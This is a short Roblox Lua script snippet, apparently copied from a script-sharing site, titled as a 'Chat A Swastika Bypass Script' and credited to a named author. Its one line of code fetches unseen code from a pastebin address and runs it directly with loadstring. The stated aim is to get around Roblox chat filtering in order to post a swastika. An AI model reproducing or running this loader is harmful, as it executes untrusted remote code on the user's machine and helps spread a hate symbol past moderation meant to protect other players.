--// source: https://robloxscripts.com/chat-a-swastika-bypass-script/
--// credits: Chat A Swastika By TheInvisible_#8856.

loadstring(game:HttpGet("https://pastebin.com/raw/ahBKsjJ2",true))()